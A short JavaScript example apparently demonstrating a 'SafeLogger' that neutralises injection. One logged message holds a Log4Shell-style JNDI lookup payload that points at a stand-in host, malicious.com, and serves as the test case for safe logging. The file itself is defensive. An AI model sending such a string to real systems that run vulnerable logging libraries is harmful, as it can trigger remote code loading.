const SafeLogger = require('./safeLogger');

const logger = new SafeLogger('MyApp');

// Example of safe logging - no JNDI lookup is executed
logger.info('User logged in: ${jndi:ldap://malicious.com/a}');
// Output: [INFO] [MyApp] User logged in: (empty)

logger.info('Processing order {}', '123');
// Output: [INFO] [MyApp] Processing order 123
